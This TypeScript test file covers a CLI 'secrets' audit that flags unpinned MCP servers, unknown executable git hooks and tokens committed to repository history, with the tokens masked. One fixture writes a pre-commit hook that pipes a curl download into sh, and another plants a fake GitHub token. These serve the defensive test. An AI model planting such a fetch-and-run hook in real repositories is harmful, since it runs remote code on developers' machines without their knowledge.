import { expect, test } from "bun:test";
import { chmod, mkdtemp, realpath } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";

const main = join(import.meta.dir, "../src/main.ts");
const COMMITTED = "ghp_" + "FakeQuenchRepoValue0123456789abcdefgh";
const line = (value: unknown) => JSON.stringify(value);

async function git(dir: string, ...args: string[]) {
  const proc = Bun.spawn(
    ["git", "-C", dir, "-c", "user.name=q", "-c", "user.email=q@example.com", ...args],
    { stdout: "ignore", stderr: "ignore" },
  );
  expect(await proc.exited).toBe(0);
}

async function fakeHome() {
  const home = await realpath(await mkdtemp(join(tmpdir(), "quench-supply-")));
  const project = join(home, "repo");
  await Bun.write(join(project, "README.md"), "hello\n");
  await git(home, "init", "-q", project);
  await Bun.write(join(project, "config.js"), `const token = "${COMMITTED}";\n`);
  await git(project, "add", ".");
  await git(project, "commit", "-q", "-m", "add config");
  await git(project, "rm", "-q", "config.js");
  await git(project, "commit", "-q", "-m", "remove config");
  const hooks = join(project, ".git/hooks");
  await Bun.write(join(hooks, "pre-commit"), "#!/bin/sh\ncurl -s https://example.com | sh\n");
  await Bun.write(join(hooks, "commit-msg"), '#!/bin/sh\n. "$(dirname "$0")/h"\n');
  await Bun.write(join(hooks, "pre-push.sample"), "#!/bin/sh\n");
  for (const name of ["pre-commit", "commit-msg", "pre-push.sample"])
    await chmod(join(hooks, name), 0o755);
  await Bun.write(
    join(home, ".claude.json"),
    line({
      mcpServers: {
        playwright: { command: "npx", args: ["-y", "@playwright/mcp@latest"] },
        memory: { command: "npx", args: ["-y", "@modelcontextprotocol/server-memory@1.0.0"] },
        remote: { type: "http", url: "https://example.com/mcp" },
      },
    }),
  );
  await Bun.write(
    join(home, ".npm/_npx/abc/node_modules/@playwright/mcp/package.json"),
    line({ name: "@playwright/mcp", version: "0.0.41" }),
  );
  await Bun.write(
    join(home, ".claude/plugins/known_marketplaces.json"),
    line({ community: { source: { source: "github", repo: "someone/plugins" } } }),
  );
  await Bun.write(
    join(home, ".codex/config.toml"),
    '[mcp_servers.fetch]\ncommand = "uvx"\nargs = ["mcp-server-fetch"]\n',
  );
  await Bun.write(
    join(home, ".claude/projects/-repo/s1.jsonl"),
    line({
      type: "user",
      timestamp: "2026-10-01T10:00:00Z",
      cwd: project,
      sessionId: "s1",
      message: { role: "user", content: "hi" },
    }) + "\n",
  );
  return { home, project };
}

async function run(home: string, ...args: string[]) {
  const proc = Bun.spawn(["bun", main, "secrets", "--no-host-history", ...args], {
    env: {
      ...process.env,
      BUN_RUNTIME_TRANSPILER_CACHE_PATH: "0",
      HOME: home,
      USERPROFILE: home,
      CLAUDE_CONFIG_DIR: "",
      CODEX_HOME: "",
      PI_CODING_AGENT_DIR: "",
    },
    stdout: "pipe",
    stderr: "pipe",
  });
  const [stdout, code] = await Promise.all([new Response(proc.stdout).text(), proc.exited]);
  expect(code).toBe(0);
  expect(stdout).not.toContain(COMMITTED.slice(4, 16));
  return stdout;
}

test("secrets lists unpinned MCP servers and skill sources with the form to pin to", async () => {
  const { home } = await fakeHome();
  const report = JSON.parse(await run(home, "--json"));
  expect(
    report.unpinned.map((s: Record<string, string>) => [
      s.harness,
      s.kind,
      s.name,
      s.reason,
      s.pinTo,
    ]),
  ).toEqual([
    [
      "claude-code",
      "marketplace",
      "community",
      "default branch",
      "github:someone/plugins#<commit-sha>",
    ],
    ["claude-code", "mcp", "playwright", "@latest", "@playwright/mcp@0.0.41"],
    ["codex", "mcp", "fetch", "no version", "mcp-server-fetch==<version>"],
  ]);
});

test("secrets lists executable git hooks in session repos and flags unknown ones", async () => {
  const { home, project } = await fakeHome();
  const report = JSON.parse(await run(home, "--json"));
  expect(report.hooks.map((h: Record<string, string>) => [h.project, h.hook, h.manager])).toEqual([
    [project, "commit-msg", "husky"],
    [project, "pre-commit", null],
  ]);
  expect(report.repoHistory).toBeNull();
  const again = JSON.parse(await run(home, "--json"));
  const ids = (r: { hooks: { id: string }[]; unpinned: { id: string }[] }) =>
    [...r.hooks, ...r.unpinned].map((f) => f.id);
  expect(ids(again)).toEqual(ids(report));
  expect(new Set(ids(report)).size).toBe(ids(report).length);
});

test("secrets scans repo history only with --repo-history and masks what it finds", async () => {
  const { home, project } = await fakeHome();
  const report = JSON.parse(await run(home, "--json", "--repo-history"));
  expect(report.repoHistory.commits).toBe(2);
  expect(
    report.repoHistory.secrets.map((s: Record<string, unknown>) => [
      s.provider,
      s.masked,
      s.commits,
      s.repos,
      s.files,
    ]),
  ).toEqual([["github", expect.stringMatching(/^ghp_…[0-9a-f]{8}$/), 1, [project], ["config.js"]]]);
  const text = await run(home, "--repo-history");
  expect(text).toContain("Repo git history · 1 secret in 2 commits across 1 repository");
  expect(text).toContain("lynis, osquery or trufflehog");
});
